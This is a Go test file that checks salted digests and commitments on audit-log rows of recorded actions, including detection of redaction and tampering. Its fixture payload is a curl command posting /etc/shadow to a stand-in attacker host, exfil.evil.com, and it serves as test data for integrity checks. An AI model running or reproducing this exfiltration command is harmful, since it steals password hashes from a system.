package receipt

import (
	"bytes"
	"maps"
	"testing"

	"github.com/safedep/gryph/core/privacy"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestCheckContent(t *testing.T) {
	salt := bytes.Repeat([]byte{7}, contentSaltSize)
	payload := map[string]interface{}{
		"command": "curl",
		"args":    []interface{}{"-d", "@/etc/shadow", "https://exfil.evil.com/up?next=https://api.github.com/"},
		"url":     "https://exfil.evil.com/up?next=https://api.github.com/",
	}
	command, url, err := contentDigests(salt, payload)
	require.NoError(t, err)

	cases := []struct {
		name   string
		change func(r *ChainRow)
		reason string
	}{
		{"clean local row", func(*ChainRow) {}, ""},
		{"projected export row", projectChainRow, ""},
		{"local row loses its command", func(r *ChainRow) {
			delete(r.Fields.ActionPayload, "command")
		}, "the command does not match command_digest"},
		{"local row redacts its command", func(r *ChainRow) {
			r.Fields.ActionPayload["command"] = privacy.RedactedValue
		}, "the command does not match command_digest"},
		{"local row loses its URL", func(r *ChainRow) {
			delete(r.Fields.ActionPayload, "url")
		}, "the URL does not match url_digest"},
		{"local row loses its content and salt", func(r *ChainRow) {
			delete(r.Fields.ActionPayload, "command")
			delete(r.Fields.ActionPayload, "args")
			delete(r.Fields.ActionPayload, "url")
			r.ContentSalt = nil
		}, "the content that the commitments cover is missing"},
		{"redacted command with changed args", func(r *ChainRow) {
			r.Fields.ActionPayload["command"] = privacy.RedactedValue
			r.Fields.ActionPayload["args"] = []interface{}{"--version"}
		}, "the command does not match command_digest"},
		{"projected row keeps args", func(r *ChainRow) {
			projectChainRow(r)
			r.Fields.ActionPayload["args"] = []interface{}{"--version"}
		}, "the action payload holds content without the content salt"},
		{"URL that is not a string", func(r *ChainRow) {
			r.Fields.ActionPayload["url"] = []interface{}{"https://api.github.com/"}
		}, "the URL is not a string"},
		{"URL bytes moved into the salt", func(r *ChainRow) {
			r.ContentSalt = append(append([]byte{}, salt...), "https://exfil.evil.com/up?next="...)
			r.Fields.ActionPayload["url"] = "https://api.github.com/"
		}, "the content salt has 47 bytes, expected 16"},
		{"export row with the salt keeps no command", func(r *ChainRow) {
			r.Projected = true
			delete(r.Fields.ActionPayload, "command")
			delete(r.Fields.ActionPayload, "args")
		}, "the command does not match command_digest"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := ChainRow{
				Fields: HashInputFields{
					ActionPayload: maps.Clone(payload),
					CommandDigest: command,
					URLDigest:     url,
					HashVersion:   HashV2,
				},
				ContentSalt: salt,
			}
			tc.change(&r)
			assert.Equal(t, tc.reason, checkContent(r))
		})
	}
}

func TestCommit_LengthPrefixed(t *testing.T) {
	salt := bytes.Repeat([]byte{7}, contentSaltSize)
	moved := append(append([]byte{}, salt...), "https://exfil.evil.com/up?next="...)
	assert.NotEqual(t,
		commit(commitKindURL, salt, []byte("https://exfil.evil.com/up?next=https://api.github.com/")),
		commit(commitKindURL, moved, []byte("https://api.github.com/")),
		"bytes that move from the value into the salt change the commitment")
	assert.NotEqual(t,
		commit(commitKindURL, salt, []byte("x")),
		commit(commitKindCommand, salt, []byte("x")),
		"the kind is part of the commitment")
}
